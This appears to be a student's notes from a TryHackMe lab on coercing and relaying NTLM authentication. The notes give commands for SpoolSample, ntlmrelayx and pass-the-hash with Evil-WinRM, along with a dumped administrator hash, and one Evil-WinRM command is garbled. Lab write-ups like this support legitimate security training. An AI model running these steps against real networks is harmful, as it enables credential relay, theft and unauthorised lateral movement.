---
title: '!! Performing the Exploit !!'
updated: 2023-04-28T10:22:25.0000000+04:00
created: 2023-04-25T08:13:42.0000000+04:00
---

!! Performing the Exploit !!
Tuesday, April 25, 2023
8:13 AM
We will be using SpoolSample to exploit the authentication relay.

It is a C# exploit but has already been compiled for you and stored in the C:\Tools\\ directory on THMWRK1.

### Steps to perform

1.  We will use Spoolsample.exe to coerce THMSERVER2 to authenticate to us on our AttackBox
2.  Then Impacket's ntlmrelayx.py to relay the authentication attempt THMSERVER1.

*<u>Note that if you are using your own VM, you will need to make sure you have the updated version of Impacket that supports SMBv2.</u>*

## \# Step 1: Setup the NTLM relay (on Attacker Machine)

### NTLM Relay Command 
| Command | python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -debug |
|---------|---------------------------------------------------------------------------------------------|

### Note:
If we specify the hostname of THMSERVER1 instead of the IP, the host could request that we use Kerberos authentication instead of NTLM. Hence we should specify the IP instead.

![image1](image1-127.png)

---------------------------------------------------------------------------------------------------------------------------

## \# Step 2: Coerce THMSERVER2 to authenticate to us. (On SSH Machine)

In an SSH terminal on THMWRK1, execute the following:

### SSH session on THMWRK commands:
| Command | SpoolSample.exe THMSERVER2.za.tryhackme.loc "Attacker IP" |
|---------|-----------------------------------------------------------|

![image2](image2-63.png)

## Step 3: Getting results

If all goes well, you should have received an authentication attempt and a relay to THMSERVER1.

![image3](image3-44.png)

![image4](image4-31.png)

## Step 4: Pivoting & Privilege escalation

- Now that we have dumped some hashes we need to use this for pivoting/privilege escalation

1.  Using the following Server Admin Hash:

ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c:::

2.  We will attempt to pash the hash using EvilWinRM

| Command | Evil-WinRM -i THMServer1_IP -u ServerAdmin -H ServerAdmin_hash                |
|---------|-------------------------------------------------------------------------------|
| Command | Evil-WinRM -I THMSERVER-IP - Server Admin -H 3279a0c6dfe15dc3fb6e9c26dd9b066c |

![image5](image5-21.png)

